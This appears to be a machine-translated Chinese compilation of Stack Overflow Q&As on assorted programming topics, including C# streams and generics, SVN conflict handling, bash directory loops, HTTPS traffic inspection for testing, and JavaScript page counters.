    public function __toString()
    {
        return $this->query;
    }
}

$query = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

// wrap line: 11 lines à 50 nucleotids
$seq = chunk_split($query, 50, "<br />\n");

// get help from sequence object
$sequence = new AmendSequence($seq);

// some HTML comments for demonstration purposes
$sequence->insertAt(0, "<!-- first line -->\n");
$sequence->insertAt(50, "<!-- second line -->\n", TRUE); # TRUE: Place after <br />
$sequence->insertAt(75, "<!-- inside second line -->");
$sequence->insertAt(550, "<!-- at end -->", TRUE); # TRUE: Place after <br />

// colorize
$color = '<span style="color: hsl(0,100%,25%);">';
$sequence->insertAt(49, $color);
$sequence->insertAt(50, '</span>');

printf("Sequence with %d nucleotids:\n", count($sequence)); # count gives length w/o amends
echo $sequence, "\n"; # that prints your sequence with all amends

echo $sequence->getSequence(); # without the amends 
```

现在随意对任意数量的部分进行着色 - 序列中是否已经有其他 HTML。

# c# - 如何在 ASP.NET C# 中基于 PDF 或 PPT/PPTX 或 DOC/DOCX 的第一页生成预览图像

> ID：10446167
> 
> 赞同：2
> 
> 时间：2012-05-04T09:25:46.140
> 
> 标签：c#, asp.net, image, ms-word, preview

我已阅读所有参考资料，但尚未找到解决方案。

.NET 中是否有任何第三方组件可用于完成此类工作？例如将文档（doc、pdf、ppt、xls....）转换为图像？

非常感谢，我在线等。。。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:33:25.823

您可能想看看[ImageGlue](http://www.websupergoo.com/imageglue-1.htm)。至于 MS Office 格式，我认为文件需要启用 ImageGlue 的缩略图选项才能获得预览图像。

我的公司实施了一个数字资产管理系统，该系统使用 ImageGlue 为许多不同的文件格式生成预览图像，所以它绝对可以做到这一点。

# https - 跟踪通过 https 传输的数据的工具

> ID：10446168
> 
> 赞同：1
> 
> 时间：2012-05-04T09:26:12.043
> 
> 标签：https, fiddler, packet-sniffers

我编写了一个通过 https 通道将数据传输到服务器的工具。现在需要测试团队验证我传输的数据是否完全正确。

是否有任何工具可以捕获程序通过 https 传输的数据。我正在以未加密的 xml 格式传输数据。

我用 Fiddler 试过这个，但它无法追踪数据。

有什么你知道的工具吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T10:21:21.917

如果您拥有服务器的私钥并且没有使用 Ephemeral Diffie-Hellman 密码套件（名称中包含 EDH 或 DHE 的套件，具体取决于所使用的配置），您应该能够使用[Wireshark 及其 SSL查看 SSL/TLS 流量内部模式](http://wiki.wireshark.org/SSL)。

如果您没有服务器的私钥，您可以尝试使用 MITM 代理（在这种情况下，您需要让您的客户端信任其证书），可能是其中之一：

*   [http://mitmproxy.org/](http://mitmproxy.org/)
*   [http://crypto.stanford.edu/ssl-mitm/](http://crypto.stanford.edu/ssl-mitm/)
*   [http://www.charlesproxy.com/documentation/proxying/ssl-proxying/](http://www.charlesproxy.com/documentation/proxying/ssl-proxying/)

# svn - SVN。重试交互式冲突解决

> ID：10446169
> 
> 赞同：6
> 
> 时间：2012-05-04T09:26:14.290
> 
> 标签：svn

如果我在 SVN 中进行更新导致冲突，SVN 为我提供了一系列选项来处理每个文件的冲突，包括接受任一文件、启动外部合并程序或推迟冲突解决。

如果我选择推迟解决冲突，我如何让 SVN 重复冲突解决过程。具体来说，我如何让 SVN 重新提供接受文件或启动外部合并工具的选择？

[更新] 回应 Thomas 和 Skippy 的回复。

感谢您的回答。因此，看起来 SVN 没有重新运行冲突解决过程的命令。个人认为这很糟糕。

SVN 冲突解决过程的选择之一是选择我希望保留的文件。在 SVN 中这样做的好处是 SVN 本身会处理相应文件的复制和删除，这排除了用户直接弄乱文件系统的需要，并减少了出错的可能性。

SVN 冲突解决过程提供的另一个选择是启动外部合并编辑器的选项。启动的编辑器及其设置方式可以在 SVN 配置文件中进行配置。这非常方便，因为这意味着用户不必手动将这三个文件加载到外部合并编辑器中。

除此之外，它根本没有被编码，SVN 是否有任何理由不提供重新启动冲突解决过程的功能？（也许通过仅使用路径参数调用 svn resolve）。这很好的另一个原因是它可以选择解析一个文件，或者在工作副本上递归地运行，或者在工作副本中的子树。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-08-04T09:20:50.953

在 svn 1.8.8 中，如果您对感兴趣的文件运行“svn resolve”，svn 将提供交互式冲突解决

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:37:11.167

你根本无法让它重新提供选择。您别无选择，只能选择以下几种：

> *   “手动”合并冲突文本（通过检查和编辑文件中的冲突标记）。
>     
>     
> *   将其中一个临时文件复制到您的工作文件之上。
>     
>     
> *   运行 svn revert 以丢弃所有本地更改。
>     
>     
> 
> 一旦你解决了冲突，你需要通过运行 svn resolved 让 Subversion 知道。这将删除三个临时文件，Subversion 不再认为该文件处于冲突状态。 [6]

（来自[http://chestofbooks.com/computers/revision-control/subversion-svn/Postponing-Conflict-Resolution-Tour-Cycle-Resolve-Pending.html](http://chestofbooks.com/computers/revision-control/subversion-svn/Postponing-Conflict-Resolution-Tour-Cycle-Resolve-Pending.html)）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:39:07.017

SVN 不会再问你了。但是，当您从命令行运行时`svn stat`，您应该会看到一个冲突文件列表。这些将被标记为“C”，就像如果有一个修改过的文件出现一个“M”，或者如果有一个尚未添加的文件出现一个“？”。

现在您必须手动运行[`svn resolve`](http://svnbook.red-bean.com/en/1.5/svn.ref.svn.c.resolve.html)每个文件。

# asp.net-web-api - 单元测试场景中带有asp.net WebApi的HttpClient

> ID：10446174
> 
> 赞同：9
> 
> 时间：2012-05-04T09:26:40.790
> 
> 标签：asp.net-web-api, dotnet-httpclient

我有一个集成测试，我想用它作为测试我的 WebAPI 控制器的基础。

最初我认为我必须在自主机模式下设置 WebAPI 并通过本地 Http 执行端到端测试。

然而，我后来通过查看 WebApiContrib 项目中的测试意识到，可以设置一个带有 HttpServer 设置的 HttpClient 以及到 WebAPI 控制器的正确服务路由。我似乎可以对控制器进行单元测试，而无需在自托管模式下设置 WebApi。我可以在客户端的请求中输入任何域名，并且 HttpClient 似乎自动神奇地绑定到正确的控制器。

这里是否发生了任何 Http 传输，使用一些本地进程间通信或纯粹“看到”服务器位于同一个应用程序域中并因此使用反射？发生这种情况的幕后原因是什么？

代码：

```
[Test]
public void Test_WebApi_Controller()
{
    Assembly.Load("myproj.Web");

    var prodServiceMock = new Mock<IProductService>();
    ObjectFactory.Initialize(x => x.For<IProductService>().Use(prodServiceMock.Object));                      

    var config = new HttpConfiguration();
    config.Routes.MapHttpRoute("default", "webapi/{controller}/{id}", new { id = RouteParameter.Optional });
    config.ServiceResolver.SetResolver(new WebApiDependencyResolver());

    var server = new HttpServer(config);
    var client = new HttpClient(server);

    var response = client.GetAsync("http://anything.com/webapi/product").Result;

} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-04T12:30:21.470

HttpClient 有一个可插拔的管道模型。通常，当您新建一个 HttpClient 时，您会获得一个 HttpClientHandler 实例作为默认请求处理器。HttpClientHandler 是实际执行 HttpWebRequest 的那个。HttpClientHandler 派生自 HttpMessageHandler。

毫无疑问，HttpServer 也派生自 HttpMessageHandler。所以在这个例子中，HttpServer 被传递给 HttpClient 实例以提供它的请求处理。通过将 HttpMessageHandler 传递给 HttpClient 的构造函数，您是在告诉 HttpClient 使用提供的处理程序而不是默认的处理程序。如果您查看 System.Net.Http.WebRequest 中的 WebRequestHandler，您会发现这是从 HttpClientHandler 派生的，并添加了一些特定于 Windows 桌面操作系统的额外功能。

这意味着当您向 HTTPClient 发出请求时，它会直接传递给 HttpServer 消息处理程序，然后像通常在服务器上一样进行处理。

# c# - 如何编写通用转换函数？

> ID：10446175
> 
> 赞同：0
> 
> 时间：2012-05-04T09:26:44.020
> 
> 标签：c#, c#-4.0

我正在尝试编写一个通用的转换函数，但我不知道该怎么做。这是我的骨架：

```
public static T ConvertByGenerics<T>(string value)
        {
            //what do I write here?
            return default(T);
        } 
```

有人可以帮帮我吗？我在函数中写什么来将字符串动态转换为类型 T？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:30:42.740

尝试类似：

```
public T ConvertByGenerics<T>(string value, T defaultValue)
{
   if (!string.IsNullOrEmpty(value))
   {
      return (T)Convert.ChangeType(value, typeof(T));
   }

   return defaultValue;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:40:46.773

您可能会尝试更多的事情，但它们涉及动态方法。片段中没有足够的异常处理，当然可以进行一些优化。

```
public static T ConvertByGenerics<T>(string input) {

    // be mindful of boxing 
    if (input is T) {
        return (T)(object)input;
    }

    if (input == null) {
        // throw arugment exception 
    }

    // can check for int, long ......
    if (typeof(T).IsEnum) {
        return (T)System.Enum.Parse(typeof(T), input, true);
    }

    if (typeof(T).IsAssignableFrom(typeof(string))) {
        return (T)(object)input;
    }

    try {
        return (T)Convert.ChangeType(input, typeof(T));
    }
    catch { //do nothing
    }

    // might want to cache some converters
    System.ComponentModel.TypeConverter converter = System.ComponentModel.TypeDescriptor.GetConverter(typeof(T));
    if (converter.CanConvertFrom(typeof(string))) {
        return (T)converter.ConvertFrom(input);
    }
    else {
        // better though to throw an exception here 
        return default(T);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:30:59.260

你想要的是不可能的。

为了支持任何可以想象的类型，您需要知道它将如何表示为字符串 - 一些内置值类型具有`Parse`“理解”某些字符串格式并可以将它们解析为类型的方法，但绝对有没有办法对*每一种可能的类型*都这样做。

您需要编写代码以将字符串转换为每种类型 - 这对于现有的每种类型都是不可行的。

# java - 如何在Java中提取字符串

> ID：10446177
> 
> 赞同：2
> 
> 时间：2012-05-04T09:27:01.880
> 
> 标签：java, string, substring

例如，我有一个字符串如下：

```
<http://www.w3.org/2000/01/rdf-schema#label> "Telecommunications law"@en <http://en.wikipedia.org/wiki/> 
```

提取子字符串的最简单方法是什么：

```
Telecommunication law 
```

请注意，子字符串包含一个空格。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:41:46.040

您可以使用 Pattern 和 Matcher ：

```
Pattern p = Pattern.compile("\".*\"");
Matcher m = p.matcher(s);

if(m.find()){
   String resultString = m.group();
} 
```

在您的情况下， resultString 将包含 ["Telecommunications law"] 如果您不想保留双引号，您可以修剪它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:28:42.130

`String.split()`上的字符串`"`，然后选择返回数组中的第二个元素：

```
String tokens[] = yourString.split("\"");

// tokens[1] will contain Telecommunications law 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:40:50.817

```
 public static void main(String[] args) {
 String str = "http://www.w3.org/2000/01/rdf-schema#label \"Telecommunications law\"@en http://en.wikipedia.org/wiki/" ;

 String temp = str.substring(str.indexOf('\"')+1, str.indexOf('\"',str.indexOf('\"')+1));
 System.out.print(temp);

    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T09:36:33.700

你是什​​么意思“提取字符串”？

获取字符串的第一次出现是通过：

```
int index = string.indexOf("Telecommunications law"); 
```

获取第一个括号和第二个括号之间的内容的最有效方法是：

```
final String test="http://www.w3.org/2000/01/rdf-schema#label \"Telecommunications law\"@en http://en.wikipedia.org/wiki/";
final int firstIndex=test.indexOf('\"');
final int lastIndex=test.indexOf('\"',firstIndex+1);
final String result=test.substring(firstIndex+1,lastIndex);
System.out.println(result); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-22T06:41:33.650

```
public static void main(String args[]){
String yourString = "<http://www.w3.org/2000/01/rdf-schema#label> \"Telecommunications law\"@en <http://en.wikipedia.org/wiki/>";
        String tokens[] = yourString.split("\"");

        for(int i = 0; i < tokens.length; i++){
            if(tokens[i].equals("Telecommunications law")){
                System.out.println(tokens[i]);
            }
        }
    } 
```

# c++ - 引用数据类型的 & 是返回引用本身的地址还是它所引用的值？

> ID：10446179
> 
> 赞同：2
> 
> 时间：2012-05-04T09:27:09.110
> 
> 标签：c++

我希望我可以自己测试它，但不幸的是，在我目前的情况下不可能这样做。有人愿意对此有所了解吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T09:29:51.410

它返回它所引用的值的地址。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-04T09:31:50.633

与指针不同，引用实际上不是对象。它本身没有地址，更容易将其视为编译器随后将解释的对象的别名。

无论如何，您总是可以使用[IdeOne在线测试代码](http://ideone.com/)

```
#include <stdio.h>

void func(int &z)
{
    printf("&z: %p", &z);
}

int main(int argc, char **argv)
{
    int x = 0;
    int &y = x;

    printf("&x: %p\n", &x);
    printf("&y: %p\n", &y);

    func(x);

    return 0;
} 
```

[在线执行，有结果](http://ideone.com/sX0zd)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T13:06:47.817

进一步的实验：有允许检查中间结果的在线编译器！

以 Mahmoud 在试用 LLVM 和 Clang 页面上的示例为例，我们得到以下 LLVM IR（截断）。

```
define i32 @main() nounwind uwtable {
  %x = alloca i32, align 4
  store i32 0, i32* %x, align 4, !tbaa !0
  %1 = call i32 (i8*, ...)* @printf(i8* getelementptr inbounds ([8 x i8]* @.str, i64 0, i64 0), i32* %x)
  %2 = call i32 (i8*, ...)* @printf(i8* getelementptr inbounds ([8 x i8]* @.str1, i64 0, i64 0), i32* %x)
  %3 = call i32 (i8*, ...)* @printf(i8* getelementptr inbounds ([7 x i8]* @.str2, i64 0, i64 0), i32* %x) nounwind
  ret i32 0
} 
```

...语法不太重要，重要的是要注意已声明了一个变量：（`%x`其名称与C函数的名称可疑地相似）。

这意味着编译器已经省略了`y`and`z`变量，没有为它们分配存储空间。

我会为你省去装配清单；）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T09:30:32.367

值的地址。（没有参考地址之类的东西）

您可以随时查看键盘：[http ://codepad.org/I1aBfWAQ](http://codepad.org/I1aBfWAQ)

# batch-file - 在批处理文件中，如何将参数传递给已开始运行的程序

> ID：10446182
> 
> 赞同：0
> 
> 时间：2012-05-04T09:27:27.420
> 
> 标签：batch-file

我想遍历文件夹中的一组数据并将数据作为参数传递给批处理文件中的程序。问题是当程序完成运行时，它希望用户输入一个键来终止它，例如'q'。在这种情况下，如何将击键发送到程序？

这是据我所知

```
for %%a in (*.txt) do program.exe %%a 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:28:59.047

您通常可以通过以下方式向问题发送输入`echo`：

```
for %%a in (*.txt) do (echo q|program.exe %%a) 
```

但是，如果程序需要实际的键盘输入，这将无济于事。它仅在从标准输入流中读取时才有效。

# javascript - 在javascript中获取对象的事件处理状态

> ID：10446183
> 
> 赞同：0
> 
> 时间：2012-05-04T09:27:27.717
> 
> 标签：javascript, javascript-events

我的源代码：

```
<!doctype html>
<html>
<head>
    <title>onload test</title>
    <link type="text/css" rel="stylesheet" href="spot.css" media="screen" />

</head>
<body>
  <h1>Welcome Page</h1>

  <script>

      debugger;
      function constructScripts(url, callBack) {
          var script = document.createElement("script");
          script.type = "text/javascript";
          script.src = url;
          document.getElementsByTagName("head")[0].appendChild(script);
          if (script.readyState) {
              script.onreadystatechange = function () {
                  if (script.readyState == "loaded" || script.readyState == "complete") {
                      script.onreadystatechange = null; callBack();
                  }
              };
          }
          else {
              script.onload = callBack;
          }
      }

  </script>
  <script>
      debugger;
      myCallBack = function () {
          alert(this.src + "loaded");
      }

      constructScripts("files1", myCallBack);
      constructScripts("files2", myCallBack);
      constructScripts("files3", myCallBack);

  </script>

</body>
</html> 
```

this.src 在这里未定义。我想这应该是一个“脚本”对象，它应该具有它的 src 属性，以便我可以读取文件名。这里的“这个”是谁？而且当我查看页面源代码时，这些脚本不包含在 header() 部分中。为什么会这样？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:32:18.683

当您调用`callBack`函数时，请将脚本对象传递给它，例如`callBack(script)`. 修改`callBack`函数如

```
myCallBack = function (script) {
      alert(script.src + "loaded");
  } 
```

查看源代码不显示动态加载的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:31:06.280

> this.src 在这里未定义。

它不应该是……它在前面定义过：`script.src = url`

> 我想这应该是一个“脚本”对象，它应该具有它的 src 属性，以便我可以读取文件名。这里的“这个”是谁？

`onload`触发or`readystatechange`事件的脚本元素

> 而且当我查看页面源代码时，这些脚本不包含在 header() 部分中。为什么会这样？

因为您正在查看页面源代码，而不是实时 DOM 在被 JavaScript 操作后的序列化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:07:29.337

您需要使用原型扩展您的功能。

```
Element.prototype.MyMethod = function(){} 
```

查看您编辑的代码

```
<!doctype html>
<html>
<head>
    <title>onload test</title>
    <link type="text/css" rel="stylesheet" href="spot.css" media="screen" />

</head>
<body>
  <h1>Welcome Page</h1>

  <script>
        Element.prototype.MyMethod = function(){}
      function constructScripts(url, callBack) {
          var script = document.createElement("script");
          script.type = "text/javascript";
          script.src = url;
          script.MyMethod = callBack;
          document.getElementsByTagName("head")[0].appendChild(script);
          if (script.readyState) {
              script.onreadystatechange = function () {
                  if (script.readyState == "loaded" || script.readyState == "complete") {
                      script.onreadystatechange = null; 
              script.MyMethod();
                  }
              };
          }
          else {
              script.onload = callBack;
          }
      }

  </script>
  <script>
      myCallBack = function () {
          alert(this.src + "loaded");
      }

      constructScripts("files1", myCallBack);
      constructScripts("files2", myCallBack);
      constructScripts("files3", myCallBack);
  </script>

</body>
</html> 
```

# bash - cd进入while循环中的目录不起作用

> ID：10446186
> 
> 赞同：5
> 
> 时间：2012-05-04T09:27:33.213
> 
> 标签：bash

我有以下脚本：

```
#!/bin/bash

ls -1 | while read d
do 
    [[ -f "$d" ]] && continue
    echo $d
    cd $d
done 
```

问题是每个 cd 都说“[路径]：没有这样的文件或目录”，为什么？文件夹存在是因为我列出了它...

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-04T09:56:35.953

我在您的代码中看到两个问题：

1.  您不测试目录。
2.  一旦你`cd`进入目录，你就呆在那里。

请试试这个：

```
#!/bin/bash

ls -1 | while read d
do 
    test -d "$d" || continue
    echo $d
    (cd $d ; echo "In ${PWD}")
done 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-04T11:05:30.300

你不应该那样使用`ls`。

```
#!/bin/bash

for d in */
do 
    [[ ! -d "$d" ]] && continue
    echo "$d"
    cd "$d"
    # do something
    cd "$OLDPWD"
done 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:54:47.457

不知道你想要达到什么目的。你想做某种递归 dic 遍历吗？

这是我会这样做的：

```
#!/bin/bash                                                                                                                                                                                                                            
CWD="$(pwd)" #save starting directory
ls -1 | while read d
do
    [[ ! -d "$d" ]] && continue
    cd "$d"
    echo "Changed to directory" $d
    #Now you can do someting in the sub-directory
    cd "$CWD" #Change back to old directory
done 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T09:30:05.310

问题是您更改了脚本中的工作目录。这意味着第二个`cd`将在您之前输入的子目录中执行`cd`。

```
dir=`pwd`
ls -1 | while read d
do 
    [[ -f "$d" ]] && continue
    cd "$dir"
    echo $d
    cd $d
    #....
done 
```

# ruby-on-rails - 为什么nginx服务器文件上传总是失败？

> ID：10446193
> 
> 赞同：2
> 
> 时间：2012-05-04T09:28:01.930
> 
> 标签：ruby-on-rails, nginx, passenger

具体情况是：我有一个app（rails+passenger+nginx），提供了上传功能给用户上传文件。测试后我部署到服务器

1.  用我的电脑文件上传一切ok
2.  用我公司电脑上传文件也ok
3.  为您的伙伴提供，当上传文件到半页链接中断。
4.  合作伙伴用他公司的电脑上传，也就是上传一半中断链接。
5.  合作有时可以上传（风险很小） 大部分是他们上传的半页被屏蔽

我登录到服务器，查看发现的日志和发生了什么，无一例外。

PS：小伙伴们之前做过重系统（在上传之前没有做系统）。用firefox浏览器是，也用ie浏览器失败 我猜是伙伴网络问题。还有一个可能是我的nginx配置出了问题。没有找到正确的起点来检查问题。第一个问题贴出来，希望能帮助大家出个主意

以下是我的 nignx 配置：

```
 include       mime.types;
    default_type  application/octet-stream;
    log_format  simple '$remote_addr - [$time_local] "$request" $status $body_bytes_sent';
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  180;

    include /opt/nginx/conf/sites-enabled/*; 
```

# c# - 从内存流读取到字符串

> ID：10446194
> 
> 赞同：51
> 
> 时间：2012-05-04T09:28:03.600
> 
> 标签：c#, xml-serialization, xmlserializer, memorystream

我正在尝试将对象写入 Xml 字符串并将该字符串保存到数据库中。但首先我需要得到字符串......

```
 private static readonly Encoding LocalEncoding = Encoding.UTF8;

    public static string SaveToString<T> (T settings)
    {
        Stream stream = null;
        TextWriter writer = null;
        string settingsString = null;

        try
        {
            stream = new MemoryStream();

            var serializer = new XmlSerializer(typeof(T));

            writer = new StreamWriter(stream, LocalEncoding);

            serializer.Serialize(writer, settings);

            var buffer = new byte[stream.Length];

            stream.Read(buffer, 0, (int)stream.Length);

            settingsString = LocalEncoding.GetString(buffer);
        }
        catch (Exception ex)
        {
            // If the action cancels we don't want to throw, just return null.
        }
        finally
        {
            if (stream != null)
                stream.Close();

            if (writer != null)
                writer.Close();
        }

        return settingsString;
    } 
```

这似乎有效，流被字节填充。但是当我把它读回缓冲区然后读入字符串时......缓冲区充满了'0'！不知道我在这里做错了什么。

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-05-04T09:30:16.953

如果您检查了 的结果`stream.Read`，您会发现它没有读取任何内容 - 因为您没有倒带流。（您可以使用 . 来执行此操作`stream.Position = 0;`。）但是，调用 更容易`ToArray`：

```
settingsString = LocalEncoding.GetString(stream.ToArray()); 
```

（您需要将 from 的类型更改为`stream`to `Stream`，`MemoryStream`但这没关系，因为它与您创建它的方法相同。）

或者 - 甚至更简单 - 只需使用`StringWriter`而不是`StreamWriter`. 如果您想使用 UTF-8 而不是 UTF-16，则需要创建一个子类，但这很容易。有关示例，请参[见此答案。](https://stackoverflow.com/a/955698/22656)

顺便说一句，我担心你只是捕捉`Exception`并*假设*它意味着无害的东西 - 甚至没有记录任何东西。请注意，`using`语句通常比编写显式`finally`块更干净。

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2015-01-29T15:20:01.633

```
string result = System.Text.Encoding.UTF8.GetString(fs.ToArray()); 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2015-10-19T22:40:08.273

```
string result = Encoding.UTF8.GetString((stream as MemoryStream).ToArray()); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-09-13T08:14:12.527

在流长度非常大的情况下，由于[大对象堆](https://docs.microsoft.com/en-us/dotnet/standard/garbage-collection/large-object-heap)存在内存泄漏的危险。即stream.ToArray创建的字节缓冲区在堆内存中创建了内存流的副本，导致保留内存的重复。我建议使用 a `StreamReader`， a并在缓冲区`TextWriter`块中读取流。`char`

在netstandard2.0`System.IO.StreamReader`中有一个方法[ReadBlock](https://docs.microsoft.com/en-us/dotnet/api/system.io.streamreader.readblock?view=netstandard-2.0#System_IO_StreamReader_ReadBlock_System_Char___System_Int32_System_Int32_)

您可以使用此方法来读取 Stream 的实例（也是 MemoryStream 实例，因为 Stream 是 MemoryStream 的父级）：

```
private static string ReadStreamInChunks(Stream stream, int chunkLength)
{
    stream.Seek(0, SeekOrigin.Begin);
    string result;
    using(var textWriter = new StringWriter())
    using (var reader = new StreamReader(stream))
    {
        var readChunk = new char[chunkLength];
        int readChunkLength;
        //do while: is useful for the last iteration in case readChunkLength < chunkLength
        do
        {
            readChunkLength = reader.ReadBlock(readChunk, 0, chunkLength);
            textWriter.Write(readChunk,0,readChunkLength);
        } while (readChunkLength > 0);

        result = textWriter.ToString();
    }

    return result;
} 
```

注意。由于使用了MemoryStream，内存泄漏的危害并没有完全消除，可能导致大内存流实例（memoryStreamInstance.Size >85000 bytes）的内存泄漏。您可以使用[Recyclable Memory stream](http://www.philosophicalgeek.com/2015/02/06/announcing-microsoft-io-recycablememorystream/)，以避免 LOH。这是相关的[图书馆](https://github.com/Microsoft/Microsoft.IO.RecyclableMemoryStream)

# javascript - 使用 javascript 计数器

> ID：10446198
> 
> 赞同：-1
> 
> 时间：2012-05-04T07:29:07.883
> 
> 标签：javascript, php

```
<?php
    session_start();

    if(isset($_SESSION['views']))
    $_SESSION['views']=$_SESSION['views']+1;

    else
    $_SESSION['views']=1;
    echo "Views=". $_SESSION['views'];
    echo '<br>'."<a href='destroy.php'>Set Counter1</a>";
    ?> 
```

上面的代码维护了一个计数器，每次用户刷新页面时它都会增加。我想做同样的工作，但使用 javascript 但找不到任何在线帮助 plz

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:36:54.590

我们必须首先弄清楚你到底想要达到什么目的。JavaScript 在客户端的浏览器中运行，因此它无法以任何方式在您的服务器上更改 $_SESSION，这一切都靠它自己。如果您希望仅在客户端保留此计数器，请尝试[通过 JavaScript 设置 cookie](http://www.w3schools.com/js/js_cookies.asp)。另一种选择是继续将计数器存储在服务器会话中并通过 AJAX 递增它。依赖 JavaScript 工作的东西的问题是它们不可靠，因为客户端总是可以选择禁用 JavaScript。也许更好的选择是嵌入一个 iframe，它针对增加计数器的 PHP 脚本......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:32:10.507

如果刷新页面，javascript 将再次加载并从零开始。您必须通过使用 AJAX（结合您的 php 脚本）或使用 cookie 来使计数持久化。在此页面上，您可以找到一个小教程：[http ://www.quirksmode.org/js/cookies.html](http://www.quirksmode.org/js/cookies.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-31T17:02:24.900

JavaScript 在刷新后无法记住任何变量。您必须将计数保存在服务器或客户端计算机上。
如果您希望将计数存储在客户端，您可以使用 localstorage：

```
window.onberforeunload=function(){
    localStorage.loads++;
    return true;
} 
```

或使用 cookie：

```
window.onbeforeunload=function(){
    document.cookie="NAME; VALUE; EXPIRE";
} 
```

请注意，localstorage 仅适用于具有 HTML5 的较新浏览器

# iphone - IOS：如何将一个用户定义模型类复制到它的类型的另一个对象

> ID：10446206
> 
> 赞同：0
> 
> 时间：2012-05-04T09:28:37.377
> 
> 标签：iphone, ios, object

# 我在处理对象时遇到问题

我创建了一个模型类并在我需要的地方使用了对象。当然，出于某种原因，我需要一份它的副本

所以我以以下方式使用

```
 Modeldata *copyOfDate=[[[Modeldata alloc]init ]autorelease];
 copyOfDate=[g_Data copy];//This Line Gives me a Exception . 
```

我想我需要覆盖复制方法和赋值运算符。

请为我提供解决方案，我正在等待快速响应

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:46:22.840

您需要`copyWithZone`在模型类实现中覆盖方法，如下所示。

```
@implementation Modeldata

-(id) copyWithZone: (NSZone *) zone
{
     Modeldata *objModeldata = [[Modeldata allocWithZone:zone] init];
     objModeldata.yourProperty = yourProperty;
     objModeldata.yourProperty1 = yourProperty1; //All your properties
     return objModeldata;
}

@end 
```

现在，如果您执行以下操作将起作用

```
Modeldata *copyOfDate=[g_Data copy]; 
```

你不需要通过写在那里分配内存

```
Modeldata *copyOfDate=[[[Modeldata alloc]init ]autorelease]; 
```

# drupal - 我可以用 Drupal 和 Organic Groups 做到这一点吗？

> ID：10446208
> 
> 赞同：0
> 
> 时间：2012-05-04T09:28:40.697
> 
> 标签：drupal, organic-groups

基本上我有一个站点，我希望我的客户成为组的所有者，然后匿名用户可以通过他们的组添加节点，如果有人在他们的组中添加节点，我的客户将收到通知。

基本上，该服务是一个潜在客户生成服务，因此实际上内容类型是一个登录页面，当匿名用户输入他们的详细信息时，取决于他们通过哪个组进行操作，客户端将收到通知。

即，我的客户组是 www.example.com/group1，他们会发送带有其 URL 的链接以生成一些潜在客户。example.com/group1/node/add/landing-page

创建此节点后，是否可以通知 group1 所有者（我假设我设置了正确的规则）？

最重要的是，我希望 group1 所有者能够登录并查看在其组中创建的所有节点的视图显示。

我认为 Organic Groups 是去这里的最佳方式，但我可能弄错了 - 任何 hep 都会受到赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-05T00:27:08.193

除非这在 D7 中发生了巨大变化，否则我认为您将无法让匿名用户在群组中发帖。OG 的整个概念和结构依赖于登录和可识别的用户。

换句话说，我认为您必须是组的成员才能在其中发帖，并且匿名（用户 0）永远不能属于组。

# c++ - Qt：创建自定义 QTextCursor 选择

> ID：10446213
> 
> 赞同：0
